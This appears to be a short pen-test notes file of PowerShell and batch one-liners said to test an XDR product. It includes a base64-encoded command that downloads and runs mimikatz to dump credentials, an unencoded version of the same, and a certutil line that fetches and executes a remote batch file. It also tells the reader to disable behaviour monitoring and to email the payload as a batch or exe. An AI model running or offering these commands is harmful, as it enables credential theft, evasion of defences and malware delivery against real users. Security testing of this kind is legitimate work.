# Pen-test proof of concept code 

## converting to Base64 encoded string
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 

## running the encoded command with powershell
powershell.exe -encoded $Encoded

## mimikatz powershell encoded.bat win10 compatible, disable behavior monitoring to test xdr, open admin cmd prompt and paste code below
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGEAYwBrAGMAbwAvAHAAbwBjAC8AbQBhAHMAdABlAHIALwBtAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAuAHQAeAB0ACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA


## original mimikatz powershell not encode win10 compatible, open admin cmd prompt and paste code below
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chackco/poc/master/mimikatz.ps1.txt'); $m = Invoke-Mimikatz -DumpCreds; $m


## test xdr 2, open admin cmd prompt and paste code below
certutil.exe -urlcache -f https://raw.githubusercontent.com/chackco/poc/master/testxdr.bat.txt c:\testxdr.bat && c:\testxdr.bat

## you can mix and match like
save above command as batch/ convert to exe and send using email
after open email > save file and run batch/exe to test email module
